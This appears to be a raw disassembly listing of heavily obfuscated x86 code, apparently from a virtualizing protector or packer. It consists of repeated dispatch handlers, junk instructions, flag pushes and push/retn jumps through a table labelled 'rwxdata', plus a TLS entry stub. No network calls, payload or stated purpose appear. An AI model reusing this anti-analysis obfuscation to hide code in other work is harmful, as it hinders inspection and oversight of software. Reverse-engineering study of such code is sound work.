push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_514146
pushfd
pop [ esp + 0x30 ]
call sub_512cef
push [ esp + 0x28 ]
pop [ ebp ]
mov [ esp + 0x8 ] cl
pushfd
pushfd
lea esp [ esp + 0x34 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5141a3
pushfd
pop [ esp + 0x4c ]
push esi
call sub_5133ed
pushfd
mov [ ebp ] eax
pushfd
mov [ esp + 0x1c ] esp
lea esp [ esp + 0x24 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5141cf
call sub_513aac
pushfd
call sub_5133e3
push [ rwxdata ]
pop [ esp + 0x48 ]
push 0x59c3ff4f
mov [ esp + 0xc ] 0x6d5002e3
mov [ esp + 0x48 ] 0x0
pushfd
pushfd
mov [ esp ] 0xb5b9
lea esp [ esp + 0x50 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51420a
push [ rwxdata ]
pop [ esp + 0x50 ]
mov [ esp + 0x8 ] 0xb9
call j_sub_511dfc
jmp rwxdata
pushfd
pop [ esp + 0x1c ]
push edx
push 0x3a284149
mov [ esp + 0x20 ] ebx
pushad
push [ rwxdata ]
pop [ esp + 0x3c ]
call sub_511b15
mov [ esp + 0x2c ] edx
push esp
jmp rwxdata
push 0xb196af6
pushfd
pushfd
pop [ esp + 0x34 ]
jmp sub_513c1c
sub_514229
cmc
test dl 0x2f
cmp dx ax
cmp [ ebp + 0xc ] 0x1
mov [ esp ] bl
push 0xc73fd950
pushfd
mov [ ebp + 0xc ] eax
pushad
mov [ ebp + 0x8 ] ebx
jmp rwxdata
push 0x6d6bf94a
jmp rwxdata
mov [ ebp + 0x4 ] ecx
mov [ esp + 0x8 ] al
mov [ esp ] bl
jmp rwxdata
pushfd
mov [ ebp ] edx
push [ esp ]
pushfd
push [ esp ]
call sub_513102
jmp rwxdata
push [ esp ]
mov [ esp + 0x4 ] edi
push [ esp ]
mov [ esp + 0x4 ] ecx
pushad
pushad
mov [ esp + 0x40 ] edx
lea esp [ esp + 0x40 ]
jno rwxdata
call j_sub_5132fa
mov [ esp ] 0x36
test bl 0x88
sub ebp 0x2
pushfd
shr ax cl
pushfd
jmp rwxdata
push esi
pushad
pushfd
pop [ esp + 0x20 ]
push [ esp ]
mov [ esp + 0x20 ] ebx
mov [ esp ] 0xb4
push [ rwxdata ]
pop [ esp + 0x1c ]
mov [ esp + 0x8 ] 0x36
mov [ esp + 0x18 ] 0x0
mov [ esp ] 0x3c
lea esp [ esp + 0x18 ]
jmp rwxdata
pushfd
pushfd
mov [ ebp + 0x4 ] ax
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
call j_sub_5140cb
mov [ esp + 0x28 ] ecx
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
pushfd
jmp rwxdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x8 ] cx
pushfd
pushfd
pop [ esp + 0x28 ]
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
pushad
call sub_511276
xchg bp ax
pop eax
jmp rwxdata
push edi
pushfd
mov [ esp + 0x4 ] ebx
pushad
mov [ esp + 0x8 ] ax
mov [ esp ] bx
push [ rwxdata ]
pop [ esp + 0x20 ]
pushad
jmp rwxdata
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
push [ esp ]
mov [ esp + 0x40 ] 0x0
push [ esp ]
push 0xad29083b
push [ esp + 0x4 ]
lea esp [ esp + 0x4c ]
jmp rwxdata
sub_514274
clc
add esi 0xffffffff
push 0x2ccbc9f2
pushfd
lea esp [ esp + 0x18 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5142ab
pushfd
mov [ ss : eax ] dx
push esp
lea esp [ esp + 0x10 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5142ba
mov [ esp + 0x38 ] edx
pushfd
call j_sub_5116d6
bsf ax bx
cmp ah dl
daa
mov eax ebp
bt ecx edx
sub ebp 0x2
call sub_512a50
pushfd
jmp rwxdata
jmp rwxdata
pushfd
pop [ esp + 0x24 ]
call sub_511d07
lea ecx [ esi + 0x2348bebc ]
xchg cx ax
jmp rwxdata
xchg bp ax
pop eax
jmp rwxdata
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
sub_514309
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x18 ] 0x29
lea esp [ esp + 0x38 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_247300
push 0x581a5821
mov [ esp + 0x18 ] rwxdata
jmp rwxdata
mov [ esp + 0x14 ] eax
pushad
pushfd
pushfd
push [ esp + 0x3c ]
retn 0x40
sub_249ab0
mov [ esp + 0x30 ] eax
push 0x8f433439
pushfd
pushfd
push [ esp ]
push [ esp + 0x40 ]
retn 0x44
sub_249ac5
lodsb [ esi ]
jmp sub_4d7a78
sub_24a039
mov [ esp ] 0xbe4b082
jmp sub_249977
sub_24a46c
bsr edi edi
adc di 0xb04f
mov edi [ edx + 0x1c ]
jmp sub_4d3995
sub_24a47c
push ebp
call sub_24aeaa
fistp [ ebp + 0x1c ]
lea esp [ edx - 0x80 ]
inc esp
xchg ebx eax
push ecx
test ebx edx
adc [ ebp - 0x527461fd ] esi
dec ebx
sub_24ae92
add eax edi
call sub_4d41a5
clc
test bx si
pushfd
cmp ah 0x2e
pushad
pushfd
push [ esp + 0x28 ]
retn 0x2c
sub_24aeaa
mov [ esp + 0x8 ] 0xa89ca49d
push 0x41f92f76
lea esp [ esp + 0xc ]
jmp rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_24b266
inc ecx
not al
mov al 0x10
lea esp [ esp + 0x28 ]
call sub_4d5240
sub_24b274
pushad
call sub_4d3983
jo rwxdata
int3
mov ch 0x22
sub al 0xa4
sub_24b6d3
lea esp [ esp + 0x48 ]
call sub_4d4fe3
call sub_24a039
sub_24b6e1
cmp eax edx
jmp sub_4dc130
sub_24b895
bt edi 0xc
mov edi [ edi + ecx * 4 ]
call sub_51110a
sub_24b9e4
sub al 0x30
mov [ esp ] dx
cmp al 0x9
pushfd
call sub_2472c5
sub_24bf86
pushfd
inc esi
pushfd
mov [ esp ] 0x48b74043
mov [ esp + 0x4 ] bl
inc edi
pushfd
push [ esp + 0x8 ]
pushfd
lea esp [ esp + 0x3c ]
jmp sub_4dd2bf
sub_24bff1
mov esp ebp
movsx bp cl
pop ebp
pushad
pushfd
pushfd
mov [ esp ] dl
push [ esp + 0x28 ]
retn 0x3c
sub_24c1e5
sub al 0x30
pushfd
pushfd
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
cmc
cmp al 0x9
jmp sub_2499a2
sub_4d29ba
inc ecx
mov bl 0x90
jmp sub_51082d
sub_4d2ec7
mov [ esp + 0x2c ] rwxdata
jmp sub_4dabb3
sub_4d2eec
mov [ esp ] 0xa8fa037b
push 0x56952f46
lea esp [ esp + 0x4 ]
jmp sub_512427
j_sub_4d7783
jmp sub_4d7783
j_sub_24c1b3
stc
jmp sub_24c1b3
j_sub_24bd45
jmp sub_24bd45
sub_4d33c7
bt di dx
clc
cmp eax [ ebp - 0x10 ]
call sub_4dda7c
cmc
test sp 0x6b35
neg al
jmp sub_4d535c
sub_4d3983
[ edi ]
mov [ esp ] 0x67
call sub_4dd3d0
sub_4d398e
pushad
pushad
jmp rwxdata
inc esi
mov [ esp ] bl
pushfd
pushfd
adc dl dl
pushfd
mov [ esp ] cl
push [ esp + 0x50 ]
retn 0x54
sub_4d3995
cmp bh bl
add edi eax
jmp sub_4fef9a
sub_4d444d
call sub_4de2ea
sub_4d4452
or eax eax
jmp sub_4d47ea
sub_4d47d4
movsx eax bl
movsx ax dl
call sub_4d842b
sub_4d47e0
bt eax eax
sub ecx ebx
call sub_4da95d
sub_4d4845
pushfd
call sub_24aa78
dec edi
call 0xffffffffe45a685c
add [ esi - 0x20 ] cl
or [ 0x330a7f48 ] ecx
retn 0x4af5
sub_4d5037
mov [ esp + 0x1c ] si
jmp sub_4da471
sub_4d5138
mov [ esp + 0x4 ] edi
test al al
jmp sub_4d9d66
sub_4d5240
lea esp [ esp + 0x4 ]
call sub_24a185
pushfd
adc al al
mov [ esp ] 0x98
lea esp [ esp + 0x4 ]
jae rwxdata
call sub_4d5240
call sub_4fe2e3
sub_4d5333
lea eax [ rwxdata ]
pushfd
pushfd
push 0xefbc897
mov [ esp + 0xc ] rwxdata
push [ esp ]
mov [ esp + 0xc ] eax
mov [ esp ] 0x38a8
push [ esp + 0xc ]
retn 0x10
sub_4d551f
jmp rwxdata
pushfd
mov [ esp + 0xc ] eax
push [ esp + 0x8 ]
mov [ esp + 0x4 ] dl
push [ esp ]
pushad
push [ esp + 0x34 ]
retn 0x38
sub_4d5524
mov [ esp + 0x3c ] rwxdata
push esp
mov [ esp + 0x3c ] eax
mov [ esp + 0x8 ] 0xa3
push [ esp + 0x3c ]
retn 0x40
sub_4d553d
mov [ esp + 0x4 ] 0x464e8c75
pushad
mov [ esp + 0x24 ] eax
mov [ esp ] 0x92
push [ esp + 0x4 ]
mov [ esp ] 0x16
push [ esp + 0x28 ]
retn 0x2c
sub_4d555d
push 0x2228fc4e
mov [ esp + 0xc ] esi
bsf si di
xor si 0xb47e
bts si 0xb
mov esi edi
mov [ esp ] dh
jmp rwxdata
call sub_4d8d39
sub_4d634b
[ edi ]
call sub_24bbe8
rol dl 0x7
clc
clc
test dl 0xe8
add dl 0x0
jmp rwxdata
not dl
stc
test dx 0x3fba
call sub_24abec
sub_4d6b3e
mov [ esp ] 0x8e
push 0xb43717c3
sub al 0x30
push [ esp ]
mov [ esp + 0x4 ] 0x62b3
pushad
pushfd
lea esp [ esp + 0x30 ]
jmp rwxdata
cmc
cmp al 0x9
jmp sub_2499a2
sub_4d6ebe
mov [ esp + 0x28 ] eax
setpo al
lodsb [ esi ]
jmp rwxdata
push 0xa6a70422
jmp sub_50fb46
sub_4d7620
mov [ esp ] cl
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
jmp sub_4d7f9f
push esp
mov [ esp ] ah
push [ esp + 0x4 ]
retn 0x8
j_sub_4d7652
xor ecx ecx
lea esp [ esp + 0x4 ]
sub_4d7652
pushfd
jmp rwxdata
pushfd
jmp rwxdata
inc ecx
lea esp [ esp + 0x8 ]
jmp sub_4d7f9f
sub_4d7777
bt dx 0xc
test al al
jmp sub_4da60f
sub_4d7859
rol al cl
btr eax esi
mov eax ebp
cmc
mov bl 0x1
bt bp bx
call j_sub_4d555d
sub_4d793e
inc ecx
sub bl ah
mov [ esp ] 0x8e
xchg ebp eax
call sub_4d7859
j_sub_4d2f01
jmp sub_4d2f01
sub_4d7a65
mov [ esp + 0x2c ] eax
push eax
pushfd
pushfd
push 0x180cd367
push [ esp + 0x3c ]
retn 0x40
sub_4d7c85
pushad
mov [ esp + 0x28 ] eax
push [ esp + 0x4 ]
pushfd
mov [ esp ] 0x75
push [ esp + 0x30 ]
retn 0x34
sub_4d7ec3
pushad
mov [ esp + 0xc ] ax
push [ eax ]
pop [ esp + 0x40 ]
mov [ esp ] 0xf949
pushfd
push [ esp + 0x44 ]
retn 0x48
sub_4d7edd
push [ eax ]
pop [ esp + 0x38 ]
mov [ esp ] bh
push [ esp + 0x38 ]
retn 0x3c
j_sub_4d794b
jmp sub_4d794b
sub_4d7f9f
call sub_24a185
pushfd
push [ esp ]
mov [ esp ] 0xc1
adc ecx ecx
pushad
lea esp [ esp + 0x28 ]
call sub_24a185
call sub_4d7620
sub_4d8421
call sub_4d8d4d
call sub_4fdafa
sub_4d8d41
call sub_4d2e7d
or ebx ebx
jmp sub_4da277
sub_4d9bed
mov ebp [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x97
mov [ esp ] dx
push [ esp + 0x8 ]
retn 0x10
sub_4da19f
movzx esi [ edx + 0x1a ]
bswap edi
jmp sub_4d3783
sub_4da2d3
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
push ecx
jmp rwxdata
call sub_4d5eb1
enter 0x242f 0xd3
pushad
push [ esp + 0x24 ]
retn 0x28
sub_4da95d
push edi
call sub_4d50e4
cmp [ edi ] 0x23
pushad
call sub_4da603
int3
sub_4daba0
pushad
push 0x76a2df88
mov [ esp + 0x20 ] rwxdata
call sub_4d7ec3
sub_4db7ae
call sub_4dc01b
call sub_4d84ef
_TLS_Entry_0
jmp sub_4d559b
sub_4dd0e7
movzx esi [ edx + 0x1a ]
not di
bswap edi
lea esi [ esi + edx + 0x1c ]
bswap di
bswap di
call sub_4fd5f4
lea eax [ rwxdata ]
call sub_4ddfa3
sub_4dd26d
movzx eax al
mov eax [ edx + 0x8 ]
pushad
mov [ esp ] cl
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
or ebx ebx
jmp sub_4da277
sub_4dd8a2
mov [ esp + 0x40 ] eax
pushfd
pushfd
pushfd
push [ esp + 0x4c ]
retn 0x50
sub_4dda8b
xor al 0x7c
call sub_4d2f2f
pushfd
sub edi 0x4
call sub_4d7382
or ebp [ edx + 0x4663e1ec ]
push cs
jmp 0xffffffffaf278e0e
sub_4ddd38
mov [ esp + 0x8 ] eax
call sub_24ba0a
sub_4ddfa3
mov [ esp ] 0xde01c25
push 0x8a9e60f8
push ecx
mov [ esp + 0x8 ] rwxdata
call sub_4d7c85
xchg esi eax
xchg edi eax
mov [ edi + 0x17 ] bh
jmp sub_4ddfe6
sub_4ddfe6
push eax
retn
j_sub_5110df
jmp sub_5110df
sub_4de546
mov [ esp + 0x10 ] al
not al
cmp dl 0x40
jmp sub_4d35f3
sub_4fe34a
mov [ esp + 0xc ] rwxdata
jmp sub_4d551f
sub_4fe853
push ebx
call sub_4d45ed
not dl
stc
test dx 0x3fba
call sub_24abec
sub_4fea6f
pushad
cmp ecx [ ebp - 0x4 ]
call sub_510b6f
xchg esi eax
xchg edi eax
sub al [ edi ]
outsd
cmp [ ebx ] 0x2
xor bl [ edi - 0x57f20fb1 ]
lahf
0x5ee75cb 0x7985
sub_4fee7c
adc dl dl
lea esp [ esp + 0x4c ]
pushad
push [ esp + 0x20 ]
retn 0x24
sub_50fb3b
rol al 0x7
cmc
push ebp
stc
jmp rwxdata
add al 0x0
bt ecx 0x1a
jmp rwxdata
call sub_4de546
sub_50fb46
neg al
jmp sub_510e46
j_sub_4d555d
jmp sub_4d555d
j_sub_4fe64b
jmp sub_4fe64b
sub_511498
mov [ esp + 0x2c ] esi
call sub_512cad
mov [ esp + 0x4 ] bh
mov [ esp + 0x30 ] edx
call j_sub_514146
sub_5115ba
mov [ esp ] cx
pushfd
push esp
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4 ] 0xad
call sub_511773
j_sub_5132fa
jmp sub_5132fa
sub_511676
mov [ esp + 0x4 ] 0x4f6f
jmp sub_51412f
sub_51173e
pushfd
pop [ esp + 0x40 ]
mov [ esp + 0x4 ] 0xf5
mov [ esp + 0x3c ] ebx
mov [ esp ] 0x66
push [ rwxdata ]
pop [ esp + 0x38 ]
jmp sub_51125c
sub_5117db
pushfd
pop [ esp + 0x44 ]
push 0xf976b880
mov [ esp ] 0x30666113
pushfd
mov [ esp + 0x10 ] 0x69
mov [ esp + 0x48 ] ebx
call sub_512af4
j_sub_5140cb
jmp sub_5140cb
sub_511b15
call j_sub_5115d3
sub_511ca7
mov [ esp + 0x4 ] 0xe9a4
pushfd
pop [ esp + 0x38 ]
call sub_512cbc
sub_511d07
mov [ esp ] 0x9a
mov [ esp + 0x8 ] 0x689e
jmp sub_511621
sub_511dcc
mov [ esp + 0x18 ] dx
jmp sub_512ad4
sub_511e7e
mov [ esp + 0x40 ] ebx
call j_sub_5118c4
pushfd
clc
add ebp 0x8
pushad
call sub_5115a5
sub_511e92
mov [ esp + 0x40 ] edx
jmp sub_513bc6
sub_511f17
mov [ esp ] 0xdb
call sub_514309
pushad
pushad
call sub_513a2b
mov [ esp + 0x30 ] edx
call sub_511ee6
sub_511f4d
mov [ esp + 0x30 ] edi
push 0x5fa1f604
jmp rwxdata
mov [ esp + 0x30 ] ecx
push [ esp ]
jmp rwxdata
mov [ esp + 0x30 ] edx
call sub_511ee6
j_sub_5118c4
jmp sub_5118c4
j_sub_51420a
jmp sub_51420a
sub_512082
cmc
sub ebp 0x4
pushfd
test dl dl
mov [ ebp ] edx
call sub_514274
sub_512091
mov [ esp + 0x40 ] edx
call sub_513374
sub_51218b
mov [ esp ] 0xa3fb5a7b
pushfd
pop [ esp + 0x44 ]
pushfd
call sub_513dff
sub_51219e
push 0xfba30f34
mov [ esp + 0x28 ] ecx
call j_sub_513b8a
sub_512276
call sub_51394f
j_sub_513c36
jmp sub_513c36
j_sub_512091#2
jmp sub_512091
j_sub_513fcc
jmp sub_513fcc
sub_5123d1
xor eax eax
call sub_513d6a
push 0x24e6d209
mov esi [ ebp ]
call sub_511cb9
pushfd
pushfd
pop [ esp + 0x2c ]
call sub_511676
j_sub_511ca7
jmp sub_511ca7
j_sub_511dfc
jmp sub_511dfc
sub_512454
push [ rwxdata ]
pop [ esp + 0x30 ]
mov [ esp ] 0xac05aaec
call sub_513068
j_sub_5118e4
jmp sub_5118e4
sub_512af4
push [ rwxdata ]
pop [ esp + 0x48 ]
jmp sub_513a14
sub_512c1a
call sub_51300d
j_sub_5136fa
jmp sub_5136fa
sub_512cad
mov [ esp ] 0x4b
mov [ esp ] 0xf643
call sub_511f4d
j_sub_512f74
jmp sub_512f74
j_sub_513b37
jmp sub_513b37
sub_512d94
mov [ esp + 0x4 ] 0x5
pushfd
mov [ esp + 0x34 ] edi
call sub_5115f8
sub_512da3
mov [ esp + 0xc ] bl
mov [ esp + 0x2c ] eax
pushfd
call sub_5133b2
sub_512eb1
mov [ esp + 0x20 ] edi
pushfd
mov [ esp + 0x4 ] 0xac
